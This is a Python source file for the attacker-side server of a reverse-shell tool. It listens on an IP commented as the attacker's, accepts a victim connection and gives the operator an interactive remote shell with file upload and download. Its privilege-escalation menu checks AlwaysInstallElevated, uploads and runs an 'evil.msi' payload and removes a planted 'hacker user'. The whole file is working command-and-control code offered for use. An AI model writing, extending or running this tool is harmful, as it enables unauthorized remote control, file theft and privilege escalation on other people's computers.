import socket
import json
import os

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        target.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        target.settimeout(1)
        try:
            while True:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        target.settimeout(None)

def show_priv_esc_menu():
    print("\n=== Privilege Escalation Menu ===")
    print("[1] Check AlwaysInstallElevated (AIE)")
    print("[2] Upload evil.msi")
    print("[3] Run evil.msi")
    print("[4] Delete hacker user")
    print("[5] Return to main menu")

def target_communication():
    while True:
        print("\n=== Main Menu ===")
        print("[S] Open shell")
        print("[P] Privilege Escalation")
        print("[Q] Quit")
        choice = input("Select an option: ").strip().lower()

        if choice == 'q':
            reliable_send("quit")
            break

        elif choice == 's':
            while True:
                command = input('* Shell~%s: ' % str(ip))
                if command == 'menu':
                    print("[*] Returning to main menu...")
                    break
                reliable_send(command)
                if command == 'quit':
                    return
                elif command == 'clear':
                    os.system('clear')
                elif command[:3] == 'cd ':
                    pass
                elif command[:8] == 'download':
                    download_file(command[9:])
                elif command[:6] == 'upload':
                    upload_file(command[7:])
                else:
                    result = reliable_recv()
                    print(result)

        elif choice == 'p':
            show_priv_esc_menu()
            tool_choice = input("Select a tool: ").strip()

            if tool_choice == '1':
                reliable_send("check_aie")
                print(reliable_recv())
            elif tool_choice == '2':
                reliable_send("upload evil.msi")
                upload_file("evil.msi")
                print("[+] evil.msi uploaded.")
            elif tool_choice == '3':
                reliable_send("run_evil_msi")
                print(reliable_recv())
            elif tool_choice == '4':
                reliable_send("delete_hacker_user")
                print(reliable_recv())
            elif tool_choice == '5':
                continue
            else:
                print("[-] Invalid tool selection.")
        else:
            print("[-] Invalid main menu option.")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.164', 5555))  # Replace with attacker's IP
sock.listen(5)
print('[+] Listening For Incoming Connections...')
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
